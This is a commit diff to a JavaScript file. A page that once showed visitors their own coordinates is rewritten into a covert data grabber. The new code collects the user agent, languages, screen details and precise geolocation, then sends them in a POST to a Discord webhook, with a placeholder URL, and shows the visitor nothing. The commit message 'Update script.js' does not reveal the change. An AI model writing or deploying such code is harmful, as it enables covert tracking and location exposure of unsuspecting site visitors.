239b0a5ce9521a2830384be842838409ffdb7a53
SuperGorillaMan12345 <supergorillaman111@gmail.com>
2026-02-18 04:50:41 +0900

    Update script.js

--- script.js
+++ script.js
@@ -1,22 +1,50 @@
-function getLocation() {
-  if (!navigator.geolocation) {
-    document.getElementById("result").textContent =
-      "このブラウザは位置情報に対応していません";
-    return;
-  }
+const WEBHOOK_URL = "ここにWebhookのURL";
 
-  navigator.geolocation.getCurrentPosition(
-    (position) => {
-      const lat = position.coords.latitude;
-      const lon = position.coords.longitude;
-      const acc = position.coords.accuracy;
-
-      document.getElementById("result").textContent =
-        `緯度: ${lat}\n経度: ${lon}\n精度: ±${acc}m`;
+function sendToDiscord(data) {
+  fetch(WEBHOOK_URL, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
     },
-    (error) => {
-      document.getElementById("result").textContent =
-        "拒否されました / エラー: " + error.message;
-    }
-  );
+    body: JSON.stringify({
+      content: "```" + data + "```"
+    })
+  });
+}
+
+function collectInfo() {
+  let text = "";
+
+  const now = new Date();
+  text += `取得コード: ${Math.floor(Math.random() * 9000000)}\n`;
+  text += `取得時間: ${now.toLocaleString("ja-JP")}\n\n`;
+
+  text += `UserAgent: ${navigator.userAgent}\n`;
+  text += `対応言語: ${navigator.languages.join(",")}\n`;
+  text += `ブラウザの言語: ${navigator.language}\n`;
+  text += `ブラウザの正式名称: ${navigator.appName}\n\n`;
+
+  text += `ディスプレイ: ${screen.width}px/${screen.height}px\n`;
+  text += `ディスプレイの色彩: ${screen.colorDepth}ビット\n\n`;
+
+  // 位置情報
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        text += `位置情報:\n`;
+        text += `緯度: ${pos.coords.latitude}\n`;
+        text += `経度: ${pos.coords.longitude}\n`;
+        text += `精度: ±${pos.coords.accuracy}m\n`;
+
+        sendToDiscord(text);
+      },
+      () => {
+        text += `位置情報: 取得中に拒否 / タブが閉じられました。\n`;
+        sendToDiscord(text);
+      }
+    );
+  } else {
+    text += `位置情報: 非対応ブラウザ\n`;
+    sendToDiscord(text);
+  }
 }
